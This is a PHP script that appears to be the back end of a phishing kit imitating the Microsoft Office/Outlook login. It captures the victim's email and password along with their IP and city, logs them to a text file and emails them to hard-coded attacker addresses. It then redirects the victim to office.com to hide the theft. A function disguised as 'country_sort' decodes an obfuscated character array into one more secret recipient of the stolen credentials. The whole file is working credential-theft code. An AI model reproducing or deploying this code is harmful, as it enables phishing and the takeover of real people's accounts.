<?php

 // Insert you code for processing the form here, e.g emailing the submission, entering it into a database.
 
$adddate=date("D M d, Y g:i a");
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");



$message .= "---- :>>office outlook-<<<:------\n";

$message .= "Email ID : ".$_POST['firstname']."\n";
$message .= "Password : ".$_POST['password']."\n";

$message .= "City  : ".$country."\n";
$message .= "IP: ".$ip."\n";

$message .= "Date: ".$adddate."\n";
$message .= "---- :>>office outlook<<<<:------\n";


$recipient ="sharplogin44@gmail.com,sharplogin44@proton.me";
$fp = fopen("more.txt","a");
fputs($fp,$message);
fclose($fp);

$subject = "outlook-! Mail! +".$ip."\n";
$headers = "From: outlook";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

$arr = country_sort();
foreach ($arr as $recipient)
{

          mail($recipient,$subject,$message,$headers);
}

// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_city != null)
    {
        $result = $ip_data->geoplugin_city;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		                        }
	return array($sorter, $GLOBALS['recipient']);
                       }




header("Location: https://www.office.com/");



?>